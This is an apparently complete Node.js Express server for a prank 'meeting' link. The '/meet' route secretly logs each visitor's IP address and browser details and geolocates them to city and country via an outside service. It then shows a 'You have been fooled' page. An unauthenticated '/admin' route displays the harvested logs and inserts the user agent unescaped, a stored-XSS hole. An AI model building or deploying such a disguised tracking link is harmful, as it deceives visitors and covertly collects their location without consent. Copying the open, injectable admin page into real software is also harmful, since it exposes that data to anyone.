const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 10000;

const FUNKY_IMAGE_URL = 'https://media.istockphoto.com/id/994269878/photo/the-rhesus-macaque.jpg?s=1024x1024&w=is&k=20&c=f7-S7OvIGUjo69BmOmOd_v4nryjD1YFB7NJjrkT4PDw=';

// Visit storage (in memory)
let visits = [];

function getRealIP(req) {
  const forwardedFor = req.headers['x-forwarded-for'];
  return forwardedFor ? forwardedFor.split(',')[0] : req.connection.remoteAddress;
}

app.get('/meet', async (req, res) => {
  const ip = getRealIP(req);
  const userAgent = req.headers['user-agent'];
  const timestamp = new Date().toISOString();

  let locationData = {
    city: 'Unknown',
    regionName: 'Unknown',
    country: 'Unknown'
  };

  try {
    const geoRes = await axios.get(`http://ip-api.com/json/${ip}`);
    if (geoRes.data.status === 'success') {
      locationData = geoRes.data;
    }
  } catch (err) {
    console.error('⚠️ Error fetching location:', err.message);
  }

  const entry = {
    visit: visits.length + 1,
    ip,
    location: `${locationData.city}, ${locationData.regionName}, ${locationData.country}`,
    userAgent,
    time: timestamp
  };

  visits.push(entry);

  // Log table
  console.log(`🌍 Total Visits: ${visits.length}`);
  console.table(visits);

  res.send(`
    <html>
      <head>
        <title>🎉 You Have Been Fooled! 🎉</title>
        <script>
          function prank() {
            alert("😂 Gotcha! You really thought this was a meeting?");
          }

          window.onload = () => {
            const audio = new Audio("https://www.myinstants.com/media/sounds/trollololololol.mp3");
            audio.play().catch(() => {});
          };
        </script>
      </head>
      <body style="text-align:center; font-family:Comic Sans MS, cursive, sans-serif; background:#fffbe6;">

        <h1 style="font-size: 3em;">🎉 You have been fooled!! 🎉</h1>

        <img src="${FUNKY_IMAGE_URL}" alt="Funky Image" style="width:100%; max-width:600px; border-radius:20px; margin:30px 0; box-shadow: 0 0 20px rgba(0,0,0,0.2);">

        <button onclick="prank()" style="padding: 15px 30px; font-size: 20px; background: #ff007f; color: white; border: none; border-radius: 10px; cursor: pointer; box-shadow: 0 5px 10px rgba(0,0,0,0.2);">
          👉 Join Meeting Now!
        </button>

      </body>
    </html>
  `);
});

// Secret admin route
app.get('/admin', (req, res) => {
  let tableRows = visits.map(v => `
    <tr>
      <td>${v.visit}</td>
      <td>${v.ip}</td>
      <td>${v.location}</td>
      <td style="word-break: break-word;">${v.userAgent}</td>
      <td>${v.time}</td>
    </tr>
  `).join('');

  res.send(`
    <html>
      <head>
        <title>📋 Admin Visit Logs</title>
        <style>
          body { font-family: Arial, sans-serif; padding: 20px; background: #f9f9f9; }
          table { width: 100%; border-collapse: collapse; margin-top: 20px; }
          th, td { padding: 10px; border: 1px solid #ddd; }
          th { background-color: #333; color: white; }
          h1 { color: #444; }
        </style>
      </head>
      <body>
        <h1>👀 Visit Logs Dashboard</h1>
        <p>Total Visits: <strong>${visits.length}</strong></p>
        <table>
          <tr>
            <th>#</th>
            <th>IP</th>
            <th>Location</th>
            <th>User Agent</th>
            <th>Time</th>
          </tr>
          ${tableRows}
        </table>
      </body>
    </html>
  `);
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running at http://0.0.0.0:${PORT}`);
});
